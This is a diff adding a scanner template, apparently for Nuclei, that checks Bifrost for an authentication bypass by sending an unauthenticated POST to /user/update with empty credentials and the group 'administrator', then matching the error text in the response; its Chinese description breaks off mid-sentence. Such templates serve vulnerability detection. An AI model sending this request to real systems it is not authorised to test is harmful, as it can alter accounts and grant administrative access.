@@ -1,0 +1,26 @@
+id: bifrost-user-update-authbypass
+
+info:
+  name: Bifrost 身份认证绕过
+  author: SleepingBag945
+  severity: high
+  description: 更改UserName和Password字段可以
+
+
+
+http:
+  - raw:
+      - |
+        POST /user/update HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: application/json
+        Accept-Encoding: gzip
+        
+        {"UserName":"","Password":"","Group":"administrator","Host":""}
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,"user_name and password not empty!","status")
